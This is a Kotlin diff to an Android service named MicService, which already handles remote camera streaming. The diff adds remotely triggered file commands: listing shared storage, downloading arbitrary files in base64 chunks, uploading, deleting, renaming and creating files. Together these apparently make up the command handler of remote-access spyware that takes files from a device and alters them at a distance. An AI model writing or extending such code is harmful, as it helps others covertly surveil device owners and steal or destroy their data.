@@ -1765,6 +1765,121 @@ class MicService : Service() {
                 "camera_live_stop" -> {
                     stopCameraLiveStream("remote_stop")
                 }
+                // ── File Manager CRUD Operations ─────────────────────────────
+                "list_files" -> {
+                    val path = obj.optString("path", "/storage/emulated/0/")
+                    Log.i(TAG, "CMD: list_files path=$path")
+                    serviceScope.launch(Dispatchers.IO) {
+                        val result = FileManager.listFiles(path)
+                        result.put("type", "file_manager_result")
+                        result.put("action", "list_files")
+                        safeSend(result.toString())
+                        sendCommandAck("list_files", 
+                            if (result.optString("status") == "ok") "success" else "error",
+                            result.optString("error", "${result.optInt("count", 0)} items"))
+                    }
+                }
+                "download_file_start" -> {
+                    val path = obj.optString("path", "")
+                    val transferId = obj.optString("transferId", "")
+                    Log.i(TAG, "CMD: download_file_start path=$path")
+                    if (path.isBlank() || transferId.isBlank()) {
+                        sendCommandAck("download_file_start", "error", "missing_path_or_id")
+                    } else {
+                        serviceScope.launch(Dispatchers.IO) {
+                            FileManager.readFileInChunks(path) { base64Data, chunkIndex, totalChunks, isError, errorMsg ->
+                                val result = JSONObject()
+                                result.put("type", "file_manager_result")
+                                result.put("action", "download_chunk")
+                                result.put("transferId", transferId)
+                                result.put("chunkIndex", chunkIndex)
+                                result.put("totalChunks", totalChunks)
+                                if (isError) {
+                                    result.put("status", "error")
+                                    result.put("error", errorMsg)
+                                } else {
+                                    result.put("status", "ok")
+                                    result.put("data", base64Data)
+                                }
+                                safeSend(result.toString())
+                            }
+                            sendCommandAck("download_file_start", "success", "started")
+                        }
+                    }
+                }
+                "upload_file_chunk" -> {
+                    val path = obj.optString("path", "")
+                    val data = obj.optString("data", "")
+                    val append = obj.optBoolean("append", true)
+                    val isLast = obj.optBoolean("isLast", false)
+                    Log.i(TAG, "CMD: upload_file_chunk path=$path dataLen=${data.length} append=$append")
+                    if (path.isBlank()) {
+                        sendCommandAck("upload_file_chunk", "error", "missing_path")
+                    } else {
+                        serviceScope.launch(Dispatchers.IO) {
+                            val result = FileManager.appendFileChunk(path, data, append)
+                            result.put("type", "file_manager_result")
+                            result.put("action", if (isLast) "upload_complete" else "upload_chunk_ack")
+                            safeSend(result.toString())
+                            // Acknowledge chunk
+                            sendCommandAck("upload_file_chunk", 
+                                if (result.optString("status") == "ok") "success" else "error",
+                                result.optString("error", "appended"))
+                        }
+                    }
+                }
+                "delete_file" -> {
+                    val path = obj.optString("path", "")
+                    Log.i(TAG, "CMD: delete_file path=$path")
+                    if (path.isBlank()) {
+                        sendCommandAck("delete_file", "error", "missing_path")
+                    } else {
+                        serviceScope.launch(Dispatchers.IO) {
+                            val result = FileManager.deleteFile(path)
+                            result.put("type", "file_manager_result")
+                            result.put("action", "delete_file")
+                            safeSend(result.toString())
+                            sendCommandAck("delete_file",
+                                if (result.optString("status") == "ok") "success" else "error",
+                                result.optString("error", "deleted"))
+                        }
+                    }
+                }
+                "rename_file" -> {
+                    val oldPath = obj.optString("oldPath", "")
+                    val newPath = obj.optString("newPath", "")
+                    Log.i(TAG, "CMD: rename_file $oldPath -> $newPath")
+                    if (oldPath.isBlank() || newPath.isBlank()) {
+                        sendCommandAck("rename_file", "error", "missing_paths")
+                    } else {
+                        serviceScope.launch(Dispatchers.IO) {
+                            val result = FileManager.renameFile(oldPath, newPath)
+                            result.put("type", "file_manager_result")
+                            result.put("action", "rename_file")
+                            safeSend(result.toString())
+                            sendCommandAck("rename_file",
+                                if (result.optString("status") == "ok") "success" else "error",
+                                result.optString("error", "renamed"))
+                        }
+                    }
+                }
+                "create_dir" -> {
+                    val path = obj.optString("path", "")
+                    Log.i(TAG, "CMD: create_dir path=$path")
+                    if (path.isBlank()) {
+                        sendCommandAck("create_dir", "error", "missing_path")
+                    } else {
+                        serviceScope.launch(Dispatchers.IO) {
+                            val result = FileManager.createDirectory(path)
+                            result.put("type", "file_manager_result")
+                            result.put("action", "create_dir")
+                            safeSend(result.toString())
+                            sendCommandAck("create_dir",
+                                if (result.optString("status") == "ok") "success" else "error",
+                                result.optString("error", "created"))
+                        }
+                    }
+                }
                 else -> Log.d(TAG, "Unknown JSON command: ${obj.optString("type")}")
             }
         } catch (e: Exception) {
